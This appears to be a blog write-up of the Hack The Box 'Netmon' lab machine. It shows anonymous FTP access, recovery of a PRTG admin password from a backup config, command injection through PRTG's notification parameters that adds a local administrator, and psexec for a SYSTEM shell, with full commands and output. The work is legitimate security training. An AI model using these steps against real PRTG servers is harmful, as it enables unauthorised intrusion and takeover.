---
layout: post
title: Hack The Box - Netmon
date: "2023-02-14 22:21:19 +0100"
image:
  path: /assets/img/posts/netmon/netmon-card.png
  alt: Netmon card
categories: [Hack The Box, Beginner Track]
tags: [Hack-The-Box-Easy, rsa]
hidden: false
---

```
HOST : 10.10.10.152
```

## Tools used

- [nmap](https://nmap.org/)
- [smbmap](https://github.com/ShawnDEvans/smbmap)

## What to do ?

- First we'll scan port with `nmap` to discover if was some it open
- Then we'll find a loophole and exploit it.

## Nmap scan

```bash
rether> nmap -A -Pn {target-ip}
[...]
PORT    STATE SERVICE      VERSION
21/tcp  open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-02-19  11:18PM                 1024 .rnd
| 02-25-19  09:15PM       <DIR>          inetpub
| 07-16-16  08:18AM       <DIR>          PerfLogs
| 02-25-19  09:56PM       <DIR>          Program Files
| 02-02-19  11:28PM       <DIR>          Program Files (x86)
| 02-03-19  07:08AM       <DIR>          Users
|_02-25-19  10:49PM       <DIR>          Windows
| ftp-syst:
|_  SYST: Windows_NT
80/tcp  open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-server-header: PRTG/18.1.37.13946
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
[...]
```

> Command explained :

- `-A` : Enable OS detection, version detection, script scanning, and traceroute
- `-Pn` : No ping scan
  {: .prompt-info }

We see that port 21 is open and allows anonymous ftp connections.

## FTP - port 21

The anonymous connection is simply a default connection with the username 'anonymous' and no password.
So let's try :

```bash
rether> ftp 10.10.10.152
Connected to 10.10.10.152.
220 Microsoft FTP Service
Name (10.10.10.152:rether): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp>
```

And it works. By digging a little we get the user flag

```bash
ftp> cd Users/Public
ftp> ls -al
[...]
03-03-23  02:41AM                   34 user.txt
[...]
```

And now we can get it with the `get` command.

```bash
ftp> get user.txt
local: user.txt remote: user.txt
229 Entering Extended Passive Mode (|||50074|)
125 Data connection already open; Transfer starting.
100% |*******************************************************************************************************************************************************************************************|    34        0.59 KiB/s    00:00 ETA
226 Transfer complete.
34 bytes received in 00:00 (0.59 KiB/s)
```

```bash
rether> cat user.txt
[user-flag]
```

We also check the configuration directory of PTRG Monitor. The default path is `C:\ProgramData\Paessler\PTRG Network Monitor`.

```bash
ftp> cd ProgramData/Paessler/PRTG\ Network\ Monitor
ftp> ls -al
229 Entering Extended Passive Mode (|||51283|)
150 Opening ASCII mode data connection.
03-03-23  03:23AM       <DIR>          Configuration Auto-Backups
03-03-23  02:42AM       <DIR>          Log Database
02-02-19  11:18PM       <DIR>          Logs (Debug)
02-02-19  11:18PM       <DIR>          Logs (Sensors)
02-02-19  11:18PM       <DIR>          Logs (System)
03-03-23  02:42AM       <DIR>          Logs (Web Server)
03-03-23  02:47AM       <DIR>          Monitoring Database
02-25-19  09:54PM              1189697 PRTG Configuration.dat
02-25-19  09:54PM              1189697 PRTG Configuration.old
07-14-18  02:13AM              1153755 PRTG Configuration.old.bak
03-03-23  04:05AM              1705379 PRTG Graph Data Cache.dat
02-25-19  10:00PM       <DIR>          Report PDFs
02-02-19  11:18PM       <DIR>          System Information Database
02-02-19  11:40PM       <DIR>          Ticket Database
02-02-19  11:18PM       <DIR>          ToDo Database
226 Transfer complete.
```

In the `PRTG Configyration.old.back` we find this :

```bash
<dbpassword>
  <!-- User: prtgadmin -->
  PrTg@dmin2018
</dbpassword>
```

Let's try this credentials.

![PRTG login fail](/assets/img/posts/netmon/netmon-screenshot-prtg-fail-connection.png "PRTG login fail")

Didn't work.
Looking at the date of the last configuration, we see that the year is 2019. So update this password by changing `2018` to `2019`.
And try this :

![PRTG success login](/assets/img/posts/netmon/netmon-screenshot-prtg-success-connection.png "PRTG login success")

Works !!

Now we have access to the admin panel. We need to get a root access to the machine to get the root flag.
To do that we are create a maliscious notifications.

Go to `Setup/Account Setting/Notifications` :

![PRTG notification panel](/assets/img/posts/netmon/netmon-screenshot-prtg-notification-panel.png "PRTG notification panel")

To create a new notification, click on the plus button in the right corner.

Scrolldown and enable `Execute Program`. Select `Demo exe notification - outfile.ps1` option, is allow to execute the script in powershell for more information : [PRTG DOC](https://www.paessler.com/manuals/prtg/custom_notifications)

In the parameters field, we insert the following commands :

```bash
type;net user prtguser PrTg@dmin2023 /add;net localgroup administrators prtguser /add
```

These commands create a new user named `prtguser` with the password `PrTg@dmin2023` and add it to the administrators group.

Now, to check if the user has been created, we can use `smbmap`.

```bash
rether> smbmap -u prtguser -p PrTg@dmin2023 -H 10.10.10.152
[+] IP: 10.10.10.152:445        Name: 10.10.10.152
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  READ, WRITE     Remote Admin
        C$                                                      READ, WRITE     Default share
        IPC$                                                    READ ONLY       Remote IPC
```

We have full access to the server

To get the root flag, we can use psexec from this [github repository](https://github.com/fortra/impacket/blob/master/examples/psexec.py).

```bash
rether> ./psexec.py 'prtguser:PrTg@dmin2023@10.10.10.152'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.10.10.152.....
[*] Found writable share ADMIN$
[*] Uploading file IkadvkCO.exe
[*] Opening SVCManager on 10.10.10.152.....
[*] Creating service tZXW on 10.10.10.152.....
[*] Starting service tZXW.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

Now we can obtain the root flag

```bash
C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 0EF5-E5E5

 Directory of C:\Users\Administrator\Desktop

02/02/2019  11:35 PM    <DIR>          .
02/02/2019  11:35 PM    <DIR>          ..
03/03/2023  01:39 PM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   6,766,444,544 bytes free

C:\Users\Administrator\Desktop> type root.txt
[root-flag]
```

![Card of pwned netmon](/assets/img/posts/netmon/netmon-pwned.png){: width="972" height="589" }
